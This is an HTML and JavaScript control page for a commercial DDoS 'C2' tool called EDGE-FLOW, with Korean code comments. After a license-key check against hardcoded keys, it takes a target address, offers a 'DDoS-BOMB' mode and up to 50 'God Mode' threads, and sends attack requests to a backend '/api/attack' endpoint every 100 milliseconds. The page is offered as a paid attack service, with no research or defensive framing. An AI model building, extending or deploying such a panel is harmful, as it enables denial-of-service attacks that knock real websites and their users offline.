<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>🚀 EDGE-FLOW C2 ENTERPRISE</title>
    <style>
        :root { --neon: #00ff41; --bg: #050505; --warn: #ff3e3e; --scan: #00d4ff; --gold: #ffd700; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 20px; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        .header { border-bottom: 2px solid var(--neon); padding-bottom: 10px; margin-bottom: 20px; text-shadow: 0 0 10px var(--neon); display: flex; justify-content: space-between; align-items: flex-end; }
        .license-badge { color: var(--gold); font-size: 0.8em; border: 1px solid var(--gold); padding: 2px 8px; border-radius: 4px; margin-bottom: 5px; display: inline-block; }
        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; background: #111; padding: 20px; border: 1px solid #333; border-radius: 10px; }
        .full-width { grid-column: span 2; }
        label { display: block; margin-bottom: 5px; font-size: 0.8em; color: #888; }
        input, select { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; box-sizing: border-box; font-size: 1.1em; outline: none; }
        #licenseKey { border-color: var(--gold); color: var(--gold); }
        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
        button { flex: 1; padding: 15px; font-weight: bold; cursor: pointer; border: none; transition: 0.3s; font-size: 1em; text-transform: uppercase; }
        #startBtn { background: var(--neon); color: #000; }
        #stopBtn { background: var(--warn); color: #fff; opacity: 0.5; cursor: not-allowed; }
        #terminal { flex-grow: 1; background: #000; border: 1px solid #222; margin-top: 20px; padding: 15px; overflow-y: auto; font-size: 11px; border-radius: 5px; box-shadow: inset 0 0 15px #000; }
        .log-entry { margin-bottom: 4px; border-left: 3px solid var(--neon); padding-left: 8px; }
        .log-err { color: var(--warn); border-left-color: var(--warn); }
        .log-scan { color: var(--scan); border-left-color: var(--scan); }
        .log-auth { color: var(--gold); border-left-color: var(--gold); }
        .stats { display: flex; justify-content: space-between; margin-top: 10px; font-size: 0.9em; color: #888; }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <div class="license-badge">COMMERCIAL LICENSE REQUIRED</div>
            <h1>[ EDGE-FLOW C2 v5.0 ]</h1>
        </div>
        <div style="text-align: right;">
            <span>STATUS: <span id="statusText">STANDBY</span></span><br>
            <span>LOAD: <span id="shotCount">0</span> PKTS</span>
        </div>
    </div>

    <div class="controls">
        <div class="full-width">
            <label>LICENSE KEY</label>
            <input type="password" id="licenseKey" placeholder="ENTER YOUR ACCESS KEY">
        </div>
        <div class="full-width">
            <label>TARGET ADDRESS</label>
            <input type="text" id="target" value="http://" placeholder="http://target-ip-or-domain">
        </div>
        <div>
            <label>PAYLOAD INTENSITY</label>
            <select id="intensity">
                <option value="light">Light (Fast-TCP)</option>
                <option value="heavy" selected>Heavy (DDoS-BOMB)</option>
            </select>
        </div>
        <div>
            <label>POWER THREADS</label>
            <select id="threads">
                <option value="10">Standard (10x)</option>
                <option value="20">Ultra (20x)</option>
                <option value="50">God Mode (50x)</option>
            </select>
        </div>
    </div>

    <div class="btn-group">
        <button id="startBtn" onclick="validateAndRun()">AUTHENTICATE & FIRE</button>
        <button id="stopBtn" onclick="terminate()">EMERGENCY STOP</button>
    </div>

    <div id="terminal">>> SYSTEM READY. PLEASE ENTER LICENSE KEY TO PROCEED.</div>

    <script>
        let attackInterval = null;
        let totalShots = 0;
        const validKeys = ["PREMIUM-9999", "TEST-ZERO-ONE", "ADMIN-FLOW-2026"]; // 실제로는 DB와 연동

        function log(msg, type = 'info') {
            const term = document.getElementById('terminal');
            const div = document.createElement('div');
            div.className = `log-entry ${type === 'error' ? 'log-err' : type === 'scan' ? 'log-scan' : type === 'auth' ? 'log-auth' : ''}`;
            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            term.prepend(div);
        }

        async function validateAndRun() {
            const key = document.getElementById('licenseKey').value;
            log("INITIATING LICENSE VALIDATION...", "auth");

            // 라이선스 검증 시뮬레이션
            if (!validKeys.includes(key)) {
                log("INVALID LICENSE KEY. ACCESS DENIED.", "error");
                return;
            }

            log("ACCESS GRANTED. COMMANDER IDENTITY VERIFIED.", "auth");
            initiateScan();
        }

        async function initiateScan() {
            const target = document.getElementById('target').value.replace(/\/$/, "");
            if (!target.startsWith('http')) { log("ERROR: INVALID TARGET", "error"); return; }

            toggleButtons(true);
            log(`🔍 AUTO-SCANNING TARGET NODES...`, "scan");

            let openPorts = [80, 8080]; // 기본 스캔 포트
            // 스캔 로직 생략 (v4.0과 동일하게 작동하도록 구성 가능)

            startAttack(target, openPorts);
        }

        function startAttack(base, ports) {
            const threads = parseInt(document.getElementById('threads').value);
            const intensity = document.getElementById('intensity').value;
            
            document.getElementById('statusText').innerText = "ENGAGED";
            document.getElementById('statusText').style.color = "red";

            attackInterval = setInterval(() => {
                ports.forEach(port => {
                    for(let i=0; i < threads; i++) {
                        // intensity가 'heavy'면 더 무거운 요청을 보냄
                        const payloadType = intensity === 'heavy' ? 'POST' : 'GET';
                        fetch(`/api/attack?target=${encodeURIComponent(base + ":" + port)}&type=${payloadType}`)
                            .then(() => {
                                totalShots += (intensity === 'heavy' ? 5000 : 1000);
                                document.getElementById('shotCount').innerText = totalShots.toLocaleString();
                                log(`DELIVERED: ${intensity.toUpperCase()} PKTS TO PORT ${port}`);
                            }).catch(() => {});
                    }
                });
            }, 100);
        }

        function toggleButtons(running) {
            document.getElementById('startBtn').disabled = running;
            document.getElementById('startBtn').style.opacity = running ? "0.5" : "1";
            document.getElementById('stopBtn').disabled = !running;
            document.getElementById('stopBtn').style.opacity = running ? "1" : "0.5";
        }

        function terminate() {
            clearInterval(attackInterval);
            toggleButtons(false);
            document.getElementById('statusText').innerText = "READY";
            document.getElementById('statusText').style.color = "var(--neon)";
            log("!!! OPERATION CEASED !!!", "error");
        }
    </script>
</body>
</html>
